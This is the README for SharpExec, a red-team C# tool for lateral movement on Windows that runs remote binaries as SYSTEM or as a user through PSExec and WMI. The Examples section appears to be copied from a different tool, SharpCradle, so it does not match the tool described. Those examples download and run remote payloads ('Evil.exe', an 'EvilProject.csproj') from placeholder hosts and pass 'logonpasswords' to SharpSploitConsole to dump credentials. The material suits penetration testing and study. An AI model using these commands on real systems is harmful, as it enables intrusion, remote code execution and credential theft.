# SharpExec

Description
============

SharpExec is a tool written in C# and was designed to be another option for penetration testers or red teams to perform lateral movement within a MS Windows environment. It currently includes:

PSExec module - Allows you to execute a remote binary with arguments, for example, cmd.exe as NT Authority/System.
WMI module - Allows you to execute a remote binary with aruguments, for example, cmd.exe as user.
File upload capability - Allows you to upload a custom file


Contact at:
- Twitter: @anthemtotheego

Quick blog:

http://blog.redxorblue.com/2018/10/sharpcradle-loading-remote-c-binaries.html

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

![Alt text](/sharpexec.PNG?raw=true "SharpExec")

Setup - Quick and Dirty
==============================

**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 and x86 binary found in the CompiledBinaries folder.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2017 - mileage may vary**

1. Download SharpExec tool and open up SharpExec.sln  

2. Open up SharpExec.sln in Visual Studio and compile (make sure to compile for correct architecture) - Should see drop down with Any CPU > Click on it and open Configuration Manager > under platform change to desired architecture and select ok.

3. Inside visual studio, right click References on the righthand side, choose Add Reference, then under Assemblies, search for System.Management, check the box and click OK.

4. Compile, again make sure for the correct architecture (x64 or x86), drop binary on computer or pull into memory and have fun.

Examples 
========

Web Server Download:

```SharpCradle.exe -w https://IP/Evil.exe <arguments to pass>```

```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```

File Server Download Anonymous:

```SharpCradle.exe -f \\IP\share\Evil.exe <arguments to pass>```

```SharpCradle.exe -f \\IP\share\SharpSploitConsole_x64.exe logonpasswords```

File Server Download With Creds:

```SharpCradle.exe -f -c domain username password \\IP\share\Evil.exe <arguements to pass>```

```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```

Download .NET inline project file from web:

```SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj```

